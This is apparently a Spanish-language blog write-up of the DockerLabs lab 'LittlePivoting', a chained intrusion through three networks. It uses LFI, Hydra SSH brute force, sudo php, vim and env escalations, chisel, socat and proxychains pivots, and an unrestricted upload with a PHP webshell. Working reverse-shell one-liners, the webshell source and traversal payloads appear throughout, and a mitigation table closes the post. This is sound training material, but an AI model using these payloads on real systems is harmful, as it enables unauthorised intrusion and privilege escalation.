---
layout: post
render_with_liquid: false
title: "DockerLabs Writeup: LittlePivoting"
date: 2026-04-25
category: writeups
tags: [dockerlabs, linux, medium, lfi, pivoting, docker, php, hydra, chisel, socat, proxychains, autoroute, file-upload, sudo-php, sudo-vim, sudo-env]
platform: DockerLabs
os: Linux
difficulty: Medium
has_exploits: false
resumen: "LFI en parámetro PHP que expone usuarios y configuración de Apache. Hydra SSH para entrar como manchi, fuerza bruta de su para escalar a seller y privesc por sudo php. Pivoting a dos redes internas encadenando autoroute, chisel, socat y proxychains. File upload sin filtros y sudo env como último escalón."
permalink: /writeups/littlepivoting/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | DockerLabs |
| OS         | Linux      |
| Dificultad | Medium     |
| Autor      | Ghostvyle  |

## Sinopsis

**LittlePivoting** es una máquina de DockerLabs cuyo reto principal está en el **pivoting de tres niveles** necesario para llegar a la última red. La intrusión inicial es directa: una web de tienda de teclados expone un parámetro `archivo` vulnerable a **Local File Inclusion** que se usa para enumerar usuarios y mapear la configuración de Apache. Una **fuerza bruta SSH con Hydra** abre la primera shell como `manchi`. Desde dentro se brute-forcea `su seller` y un `sudo php NOPASSWD` cierra la primera escalada a root.

Como root en la primera máquina descubrimos una segunda interfaz (`20.20.20.2`), montamos el primer pivot con **`autoroute` de Metasploit** y levantamos un **túnel chisel reverso** para enrutar tráfico externo hacia la red `20.20.20.0/24`. Gobuster localiza `secret.php` en `20.20.20.3`, que revela el usuario `mario`, Hydra encuentra `mario : chocolate` y la conexión SSH la lanzamos directamente desde dentro del primer pivot. La segunda escalada se resuelve con **`sudo vim -c ':terminal /bin/bash'`**.

Aparece entonces una **tercera red** (`30.30.30.0/24`) accesible solo desde `mario`. Para llegar a ella encadenamos un **`socat` relay** en el primer pivot que reenvía hacia el chisel server y un **segundo cliente chisel** desde `mario`, abriendo un nuevo SOCKS5 en `127.0.0.1:4444`. Con dos entradas SOCKS en `proxychains.conf` ya alcanzamos `30.30.30.3`, donde un **file upload sin filtros** acepta `simple-backdoor.php`, la reverse shell apunta a `mario` y un `sudo env /bin/bash` cierra el último privesc.

---

## Reconocimiento

### Identificación del rango

Antes de lanzar nmap confirmamos la interfaz que nos asignó la red del laboratorio:

```bash
ip a
```

![Interfaz del atacante en 10.10.10.1/24](/writeups/littlepivoting/assets/01_nmap_quick_ports.png)

Estamos en `10.10.10.1/24`. Hacemos un *host discovery* para confirmar la IP de la víctima:

```bash
sudo nmap -sn 10.10.10.0/24
```

![Host discovery en 10.10.10.0/24](/writeups/littlepivoting/assets/02_nmap_full_scan.png)

Solo `10.10.10.2` está activo aparte de nosotros.

### Escaneo de puertos

Lanzamos el escaneo de los 65535 puertos TCP:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.2 -oG allPorts
```

| Parámetro         | Descripción                              |
| ----------------- | ---------------------------------------- |
| `-p-`             | Escanea los 65535 puertos TCP            |
| `--open`          | Solo muestra puertos abiertos            |
| `--min-rate 5000` | Lanza al menos 5000 paquetes por segundo |
| `-vvv`            | Verbosidad máxima                        |
| `-n`              | Sin resolución DNS                       |
| `-Pn`             | Sin descubrimiento de hosts previo       |
| `-oG allPorts`    | Salida grepeable                         |

![Escaneo completo de puertos abiertos](/writeups/littlepivoting/assets/03_nmap_versions.png)

Dos puertos abiertos: `22/tcp` y `80/tcp`.

### Detección de versiones y NSE básico

Sobre esos dos puertos lanzamos un segundo nmap dirigido para extraer banners y aplicar los scripts por defecto:

```bash
sudo nmap -sCV -p22,80 10.10.10.2 -oN targeted
```

![Detección de versiones con -sCV](/writeups/littlepivoting/assets/04_nmap_scripts.png)

- **22/tcp** → OpenSSH 9.2p1 Debian
- **80/tcp** → Apache httpd 2.4.57 (Debian)

Y un `http-enum` para descubrir rutas web típicas:

```bash
sudo nmap --script http-enum -p80 10.10.10.2
```

![nmap http-enum descubriendo /shop/](/writeups/littlepivoting/assets/05_whatweb.png)

`http-enum` resalta `/shop/` como carpeta interesante. Confirmamos también la versión del servidor con `whatweb`:

```bash
whatweb http://10.10.10.2:80
```

![Identificación del stack web con whatweb](/writeups/littlepivoting/assets/06_web_homepage.png)

Apache 2.4.57 sobre Debian, sin tecnologías llamativas más allá del propio servidor web.

---

## Explotación inicial — Web y LFI

### Reconocimiento web

Visitamos `http://10.10.10.2/shop/` y nos encontramos una tienda de teclados simple. El detalle relevante está al final de la página: el sitio muestra un mensaje de error PHP que expone directamente el parámetro que procesa:

```php
"Error de Sistema: ($_GET['archivo']);"
```

![Tienda de Teclados — el footer revela el parámetro vulnerable](/writeups/littlepivoting/assets/08_web_footer_lfi_hint.png)

El parámetro `archivo` del `$_GET` se inyecta sin sanear. Patrón de **Local File Inclusion** de manual.

### Confirmación del LFI

Probamos a leer `/etc/passwd` con un *path traversal*:

```text
http://10.10.10.2/shop/?archivo=../../../etc/passwd
```

![Lectura de /etc/passwd vía LFI](/writeups/littlepivoting/assets/09_lfi_passwd.png)

LFI confirmado. La salida revela dos cuentas con shell asignada:

- `seller` (UID 1000)
- `manchi` (UID 1001)

### Exploración manual con Burp Repeater

Con el LFI confirmado, lo siguiente es entender la configuración del servidor. Desde Burp Repeater pedimos la configuración de Apache:

```text
GET /shop/?archivo=../../../../etc/apache2/sites-available/000-default.conf HTTP/1.1
```

![Repeater leyendo el vhost por defecto de Apache](/writeups/littlepivoting/assets/11_lfi_extra_file.png)

`DocumentRoot /var/www/html`, sin nada especial. Deja abiertos posibles vectores futuros como log poisoning o inclusión de sesiones PHP.

### Enumeración masiva con Burp Intruder

Automatizamos la enumeración de rutas típicas con **Burp Intruder**, usando un wordlist de ficheros sensibles:

```text
GET /shop/?archivo=../../../../§FUZZ§ HTTP/1.1
```

![Burp Intruder identificando ficheros legibles vía LFI](/writeups/littlepivoting/assets/12_burp_intruder_lfi.png)

Se obtienen lecturas de varios ficheros de configuración de Apache y del directorio web, pero ninguno arroja credenciales directas. Con los usuarios obtenidos del `/etc/passwd` pasamos a atacar SSH.

---

## Acceso a la primera máquina — `manchi`

### Fuerza bruta SSH con Hydra

`manchi` es un nombre poco común y el candidato más probable a tener contraseña débil. Lanzamos Hydra con un wordlist de contraseñas comunes:

```bash
hydra -l manchi -P /usr/share/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt 10.10.10.2 -t 15 ssh
```

![Hydra encontrando manchi:lovely](/writeups/littlepivoting/assets/13_hydra_manchi_ssh.png)

Resultado: **`manchi : lovely`**.

```bash
ssh manchi@10.10.10.2
```

![SSH como manchi en 10.10.10.2](/writeups/littlepivoting/assets/14_ssh_manchi_access.png)

Ya estamos dentro como `manchi`.

---

## Movimiento lateral — `manchi` → `seller`

### Enumeración del sistema

`manchi` no tiene `sudo` interesante. Disponemos de una sesión meterpreter activa que usamos para subir **pspy64** a `/tmp`:

```text
meterpreter > upload /home/ghostvyle/HackingTools/Privilege_Escalation/pspy/pspy64
```

![Subida de pspy64 a /tmp vía meterpreter](/writeups/littlepivoting/assets/18_pspy_upload.png)

Mientras tanto enumeramos manualmente vectores habituales: tareas cron y permisos sobre directorios del sistema.

![Enumeración manual de crons y permisos](/writeups/littlepivoting/assets/19_pspy_bruteforce_hint.png)

No aparece nada explotable. El siguiente objetivo natural es `seller`, el otro usuario con shell del `/etc/passwd`.

### Fuerza bruta de `su seller`

Sin un cron limpio que abusar, montamos un **bruteforce de `su`** con `bf.sh`, script de fuerza bruta que prueba contraseñas del wordlist contra `su seller`:

```bash
ls /tmp
# 2020-200_most_used_passwords.txt  bf.sh  les.sh  pspy64
./bf.sh
```

![bf.sh encontrando seller:qwerty](/writeups/littlepivoting/assets/20_bruteforcesu_seller.png)

Resultado: **`seller : qwerty`**.

```bash
su seller
# Password: qwerty
```

![Cambio de usuario a seller con la contraseña obtenida](/writeups/littlepivoting/assets/21_su_seller_success.png)

---

## Escalada en la primera máquina — `seller` → `root`

### Abuso de `sudo php`

Inspeccionamos los permisos de `sudo` para `seller`:

```bash
sudo -l
```

```text
User seller may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/php
```

`sudo php` sin contraseña permite invocar código arbitrario con privilegios de root:

```bash
sudo php -r 'system("/bin/bash -p");'
```

![sudo -l + sudo php → shell de root](/writeups/littlepivoting/assets/22_sudo_php_exec.png)

`-p` preserva el `EUID` y nos da una shell de root real. Lanzamos una reverse shell para tener sesión cómoda en el listener:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.1/2345 0>&1'
```

![Reverse shell de root disparada](/writeups/littlepivoting/assets/23_root_reverse_shell.png)

![Sesión meterpreter con getuid=root](/writeups/littlepivoting/assets/24_root_shell.png)

```text
meterpreter > getuid
Server username: root
```

![meterpreter > getuid mostrando root](/writeups/littlepivoting/assets/25_root_flag.png)

---

## Pivoting #1 — `10.10.10.0/24` → `20.20.20.0/24`

### Descubrimiento de la red interna

Inspeccionamos las interfaces desde meterpreter:

```text
meterpreter > ipconfig
```

![ipconfig revelando dos interfaces, eth0 y eth1](/writeups/littlepivoting/assets/26_pivot_ifconfig_20.png)

![Detalle de eth1 — 20.20.20.2/24](/writeups/littlepivoting/assets/27_meterpreter_route_info.png)

Aparece una **segunda NIC** en `20.20.20.2/24`. Esa red solo es alcanzable a través del host comprometido.

### Autoroute con Metasploit

Añadimos una ruta sobre la sesión meterpreter para que los módulos de Metasploit puedan dirigirse a la red interna:

```text
meterpreter > run autoroute -s 20.20.20.0/24
```

![Autoroute añadido a 20.20.20.0/24](/writeups/littlepivoting/assets/28_autoroute_20.png)

### Escaneo de la red interna

Con la ruta establecida, usamos `auxiliary/scanner/portscan/tcp` para barrer hosts:

```text
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 20.20.20.0/24
msf6 auxiliary(...) > set PORTS 21,22,23,25,80,139,443,445,3306,3389,5985,8080
msf6 auxiliary(...) > set THREADS 32
msf6 auxiliary(...) > run
```

![Resultados del portscan interno con Metasploit](/writeups/littlepivoting/assets/29_portscan_module.png)

Identificamos **`20.20.20.3`** con `22/ssh` y `80/http` abiertos.

### Túnel Chisel

Para enrutar tráfico de herramientas externas hacia la red interna levantamos un **chisel reverso**: el servidor escucha en nuestra máquina y el cliente corre dentro del pivot. Subimos el binario desde meterpreter:

```text
meterpreter > upload /home/ghostvyle/HackingTools/Pivoting/chisel
```

```bash
# En el pivot, como root
chmod +x chisel
```

![chisel subido al pivot y chmod](/writeups/littlepivoting/assets/33_chisel_upload_pivot.png)

El cliente del pivot se conecta hacia fuera al servidor, abriendo un SOCKS5 en `127.0.0.1:1080` de nuestra máquina:

```bash
# Atacante
./chisel server --reverse -p 7171

# Pivot (10.10.10.2 como root)
./chisel client 10.10.10.1:7171 R:1080:socks
```

![chisel server en 7171 con el cliente conectado desde el pivot](/writeups/littlepivoting/assets/34_chisel_server_kali.png)

Configuramos `proxychains` apuntando al SOCKS5 de chisel y verificamos con nmap:

```text
# /etc/proxychains.conf
socks5  127.0.0.1 1080
```

```bash
sudo proxychains -q nmap -sT -Pn -n --top-ports 500 --open 20.20.20.3
```

![nmap a 20.20.20.3 vía chisel — 22 y 80 abiertos](/writeups/littlepivoting/assets/35_chisel_client_pivot.png)

> Con proxychains hay que usar **`-sT`** (TCP connect). El `-sS` (SYN scan) requiere raw sockets y no funciona por SOCKS.

---

## Acceso a la segunda máquina — `mario`

### Fuzzing web a través del proxy

Atacamos la web de `20.20.20.3` con gobuster a través del SOCKS5. Con `raft-small-words` y extensiones típicas:

```bash
sudo gobuster dir -u http://20.20.20.3/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,bak,backup,conf,old,txt --proxy socks5://127.0.0.1:1080 -t 5
```

![gobuster — aparecen index.html y secret.php](/writeups/littlepivoting/assets/38_gobuster_results_secret.png)

Aparece **`secret.php`**. Configuramos **FoxyProxy** apuntando al SOCKS5 y lo abrimos en el navegador:

![FoxyProxy + secret.php — mensaje con el usuario mario](/writeups/littlepivoting/assets/39_secret_php_message.png)

```text
"Hola Mario, esta web no se puede hackear."
```

El propio mensaje confirma el siguiente objetivo: **`mario`**.

### Brute force SSH de `mario`

Repetimos la receta del primer host, tunelizando Hydra por proxychains:

```bash
proxychains -q hydra -l mario -P /usr/share/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt 20.20.20.3 -t 15 ssh
```

![Hydra contra 20.20.20.3 a través del proxy](/writeups/littlepivoting/assets/40_hydra_mario_ssh.png)

Resultado: **`mario : chocolate`**.

En lugar de tunelizar SSH desde nuestra máquina, aprovechamos que ya tenemos shell de root en `10.10.10.2` (que sí está en la red `20.20.20.0/24`) y conectamos directamente desde dentro:

```bash
# Desde root@2925a2a12bfb (primer pivot)
ssh mario@20.20.20.3
# Password: chocolate
```

![SSH a mario desde el primer pivot](/writeups/littlepivoting/assets/41_ssh_mario_access.png)

Estamos como `mario` en la segunda máquina (`fa158dcec0b4`).

---

## Escalada en la segunda máquina — `mario` → `root`

### Abuso de `sudo vim`

Permisos de sudo de `mario`:

```bash
sudo -l
```

```text
User mario may run the following commands on host fa158dcec0b4:
    (ALL) /usr/bin/vim
```

`vim` con `sudo` permite abrir un terminal embebido con privilegios heredados:

```bash
sudo vim -c ':terminal /bin/bash'
```

![sudo -l mostrando vim NOPASSWD](/writeups/littlepivoting/assets/42_sudo_vim_mario.png)

![Shell de root desde :terminal /bin/bash](/writeups/littlepivoting/assets/43_sudo_vim_terminal_root.png)

### Descubrimiento de la tercera red

Como root en la segunda máquina inspeccionamos las interfaces:

```bash
ip a
```

```text
eth0: 20.20.20.3/24
eth1: 30.30.30.2/24   ← tercera red
```

![Tercera interfaz hacia 30.30.30.0/24](/writeups/littlepivoting/assets/44_pivot_ifconfig_30.png)

Aparece una nueva red interna `30.30.30.0/24` accesible solo desde `mario`. Antes de montar el segundo pivot dibujamos el mapa completo:

![Diagrama de red intermedio antes del segundo pivot](/writeups/littlepivoting/assets/45_root_30_extra.png)

---

## Pivoting #2 — `20.20.20.0/24` → `30.30.30.0/24`

### Estrategia de doble salto

Nuestra máquina no tiene visibilidad directa con `30.30.30.0/24`: hay que rebotar dos veces.

```text
Atacante (10.10.10.1)
   │
   ▼
manchi-host (10.10.10.2 / 20.20.20.2)   ← pivot 1, comprometido (root)
   │
   ▼
mario-host (20.20.20.3 / 30.30.30.2)    ← pivot 2, comprometido (root)
   │
   ▼
30.30.30.X                              ← objetivo final
```

Plan:
1. Servir `chisel` desde el primer pivot (que `mario` sí alcanza por `20.20.20.2`).
2. Descargar el binario en `mario`.
3. Levantar un **`socat` relay** en el primer pivot (`8888 → Atacante:7171`).
4. Lanzar un segundo **`chisel client`** desde `mario` apuntando al relay → abre SOCKS5 en `127.0.0.1:4444`.
5. Encadenar **dos entradas SOCKS5** en `proxychains.conf`.

### Entrega del binario chisel a `mario`

`mario` no tiene visibilidad con nuestra máquina, pero sí con el primer pivot (`20.20.20.2`). Servimos `chisel` desde ahí con un servidor HTTP:

```bash
# 10.10.10.2 (primer pivot, como root)
python3 -m http.server 1234
```

![Servidor HTTP en el primer pivot sirviendo chisel](/writeups/littlepivoting/assets/46_kali_http_server_chisel.png)

```bash
# 20.20.20.3 (mario, como root)
wget http://20.20.20.2:1234/chisel
chmod +x chisel
```

![Descarga de chisel desde mario apuntando al primer pivot](/writeups/littlepivoting/assets/47_wget_chisel_mario.png)

### Relay con socat en el primer pivot

`mario` no puede hablar directamente con nuestra máquina, pero el primer pivot sí. Usamos **`socat`** para reenviar todo lo que entre por `8888` hacia el chisel server que ya escucha en nuestra máquina (`7171`):

```bash
# 10.10.10.2 (primer pivot, como root)
socat TCP-LISTEN:8888,fork,reuseaddr TCP:10.10.10.1:7171
```

| Elemento              | Función                                            |
| --------------------- | -------------------------------------------------- |
| `TCP-LISTEN:8888`     | Acepta conexiones entrantes en el primer pivot     |
| `fork,reuseaddr`      | Forkea por conexión y permite reusar el puerto     |
| `TCP:10.10.10.1:7171` | Las reenvía hacia el chisel server del atacante    |

### Segundo cliente Chisel desde `mario`

Desde `mario` lanzamos un segundo cliente chisel apuntando al relay. Pide al server que abra un **SOCKS5 inverso** en `127.0.0.1:4444`: cualquier tráfico que enviemos a ese puerto saldrá efectivamente desde `mario`:

```bash
# 20.20.20.3 (mario)
./chisel client 20.20.20.2:8888 R:4444:socks
```

![socat en primer pivot + chisel client desde mario conectando al relay](/writeups/littlepivoting/assets/49_socat_relay.png)

El chisel server recibe ahora dos clientes: el del primer pivot (`R:1080:socks`) y el de `mario` a través del socat (`R:4444:socks`):

![chisel server con dos sesiones activas](/writeups/littlepivoting/assets/50_chisel_client_mario.png)

### Encadenamiento de proxychains

Configuramos `proxychains` con **dos saltos SOCKS5** en cadena:

```text
# /etc/proxychains.conf
[ProxyList]
socks5  127.0.0.1 1080    # chisel pivot 1 — sale por 10.10.10.2 (alcanza 20.20.20.0/24)
socks5  127.0.0.1 4444    # chisel mario vía socat — sale por 20.20.20.3 (alcanza 30.30.30.0/24)
```

![Doble entrada SOCKS5 en proxychains.conf](/writeups/littlepivoting/assets/51_proxychains_conf_dual.png)

> En modo `strict_chain` (por defecto) `proxychains` aplica los proxies en el orden definido. El segundo SOCKS, tunelizado por chisel desde `mario`, hace que cualquier herramienta que lancemos salga efectivamente desde la segunda red.

### Descubrimiento de hosts en la tercera red

Hacemos un barrido en bash directamente desde la shell de `mario`, que ve `30.30.30.0/24` de forma nativa:

```bash
for i in {1..254}; do for p in 22 80 443 8080; do timeout 1 bash -c "echo >/dev/tcp/30.30.30.$i/$p" 2>/dev/null && echo "30.30.30.$i:$p abierto"; done; done
```

![Barrido bash sobre 30.30.30.0/24 desde mario](/writeups/littlepivoting/assets/53_bash_scan_30_results.png)

Hosts y servicios identificados:

- `30.30.30.2:22`, `30.30.30.2:80` → `mario` (nosotros)
- **`30.30.30.3:80`** → el objetivo

---

## Explotación de la tercera máquina — File Upload + Webshell

### Reconocimiento de la web

Visitamos `http://30.30.30.3/` con FoxyProxy apuntando al SOCKS5 de `127.0.0.1:4444`. La página es directamente un **formulario de upload**:

![Web de 30.30.30.3 — formulario de subida de ficheros](/writeups/littlepivoting/assets/52_web_30_homepage.png)

El código fuente confirma que el form apunta a `upload.php` sin filtros visibles sobre la extensión ni el `Content-Type`:

```html
<form action="upload.php" method="post" enctype="multipart/form-data">
  <input type="file" name="file" id="file">
  <input type="submit" name="submit" value="Upload File">
</form>
```

![view-source de 30.30.30.3 — form a upload.php sin filtros](/writeups/littlepivoting/assets/54_upload_form.png)

Patrón clásico de **Unrestricted File Upload**.

### Subida del webshell

Subimos `simple-backdoor.php` como webshell mínima:

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

![Subiendo simple-backdoor.php desde el navegador](/writeups/littlepivoting/assets/55_simple_backdoor_uploaded.png)

El servidor lo deposita en `/uploads/` y lo sirve sin transformar:

```text
http://30.30.30.3/uploads/simple-backdoor.php
```

![simple-backdoor.php devolviendo el banner de uso](/writeups/littlepivoting/assets/56_upload_success.png)

Ejecutamos un comando para confirmar RCE:

```text
http://30.30.30.3/uploads/simple-backdoor.php?cmd=cat+/etc/passwd
```

![cmd=cat+/etc/passwd → RCE como www-data](/writeups/littlepivoting/assets/57_webshell_cmd.png)

### Reverse shell hacia `mario`

`30.30.30.3` no tiene ruta de vuelta hacia nuestra máquina, así que la reverse shell apunta al **pivot intermedio** (`mario`, `30.30.30.2`). Levantamos el listener allí:

```bash
# 20.20.20.3 (mario)
ncat -lvnp 7777
```

El primer intento sin URL-encodear los caracteres especiales devuelve respuesta en blanco y no llega nada al listener:

```text
http://30.30.30.3/uploads/simple-backdoor.php?cmd=bash -c 'bash -i >& /dev/tcp/30.30.30.2/7777 0>&1'
```

![Primer intento sin encoding — respuesta en blanco, no funciona](/writeups/littlepivoting/assets/58_revshell_url_trigger.png)

Repetimos codificando `&` como `%26`:

```text
http://30.30.30.3/uploads/simple-backdoor.php?cmd=bash -c 'bash -i >%26 /dev/tcp/30.30.30.2/7777 0>%261'
```

![Reverse shell recibida en mario como www-data](/writeups/littlepivoting/assets/59_revshell_received_mario.png)

`Connection from 30.30.30.3` y prompt como `www-data@7104d77325b6:/var/www/html/uploads$`.

> Si la URL contiene `&` sin codificar, el servidor lo interpreta como separador de parámetros y la mitad del payload se pierde. Es uno de los fallos más comunes al disparar reverse shells por GET.

---

## Escalada en la tercera máquina — `www-data` → `root`

### Abuso de `sudo env`

```bash
sudo -l
```

```text
User www-data may run the following commands on 7104d77325b6:
    (root) NOPASSWD: /usr/bin/env
```

`env` con `sudo` permite invocar binarios arbitrarios con el entorno actual. Basta con pedirle que lance una bash:

```bash
sudo env /bin/bash
```

![sudo env /bin/bash — root final](/writeups/littlepivoting/assets/60_sudo_env_root.png)

Tercera máquina conquistada. Cadena de pivoting completada de extremo a extremo.

---

## Diagrama final

![Diagrama final del pivoting de tres niveles](/writeups/littlepivoting/assets/61_final_diagram.png)

```text
Atacante (10.10.10.1)
  │  nmap → web → LFI (?archivo=) → /etc/passwd
  │  Hydra SSH → manchi : lovely
  ▼
manchi-host (10.10.10.2 / 20.20.20.2)
  │  bf.sh → seller : qwerty
  │  sudo php -r 'system(...)' → root
  │  meterpreter autoroute + portscan 20.20.20.0/24
  │  chisel server:7171 ← cliente pivot R:1080:socks
  ▼
mario-host (20.20.20.3 / 30.30.30.2)
  │  gobuster (proxychains) → secret.php → usuario mario
  │  Hydra SSH (proxychains) → mario : chocolate
  │  [SSH desde root@manchi-host, no desde atacante]
  │  sudo vim -c ':terminal /bin/bash' → root
  │  socat 8888→Atacante:7171 + chisel R:4444:socks (desde mario)
  ▼
upload-host (30.30.30.3)
  │  Unrestricted File Upload → simple-backdoor.php
  │  Reverse shell URL-encoded → mario:7777
  │  sudo env /bin/bash → root
  ▼
ROOT en las tres máquinas
```

---

## Detección y mitigación

| Vector                                     | Mitigación / Detección                                                                                                                                            |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **LFI en `?archivo=`**                     | Sanear la entrada, whitelist de ficheros incluibles. WAF que bloquee `../` y rutas absolutas. Logging de peticiones con caracteres sospechosos.                  |
| **Brute force SSH (Hydra)**                | `fail2ban` o equivalente, autenticación por clave pública, deshabilitar `PasswordAuthentication`, monitorizar picos de fallos en `/var/log/auth.log`.            |
| **Bruteforce de `su`**                     | Auditar fallos de PAM (`pam_unix(su:auth): authentication failure`). Cientos de intentos en segundos contra el mismo usuario son inmediatamente detectables.    |
| **`sudo php` / `sudo vim` / `sudo env`**   | Auditar `/etc/sudoers`. Ningún intérprete ni editor con terminal debe aparecer como `NOPASSWD`. `auditd` puede alertar ante invocaciones sospechosas.            |
| **Pivoting (autoroute, chisel, socat)**    | Segmentar redes con firewalls estrictos. EDR que detecte binarios desconocidos (`chisel`, `socat`, `pspy64`, `bf.sh`) en `/tmp`.                                 |
| **File upload sin filtros**                | Whitelist de extensiones, validación MIME por magic bytes, `Options -ExecCGI` y `RemoveHandler .php` en uploads, almacenamiento fuera del DocumentRoot.          |
| **Webshell `simple-backdoor.php`**         | YARA / hashes sobre los ficheros web, alertas por nuevos `.php` en directorios de uploads, monitorización de procesos hijos de `apache2`/`php-fpm`.                  |

El patrón más detectable de toda la cadena son los **binarios extraños en `/tmp`** y la presencia de un proceso `socat` aceptando conexiones en un host que nunca debería actuar como relay. Una baseline de procesos y conexiones de red activas basta para levantar la alerta.

---

> **Disclaimer**: Este contenido es exclusivamente para investigación y formación en ciberseguridad. Solo debe aplicarse en entornos autorizados y controlados como los laboratorios de DockerLabs, HackTheBox o entornos propios. El uso de estas técnicas contra infraestructura sin permiso explícito es ilegal.
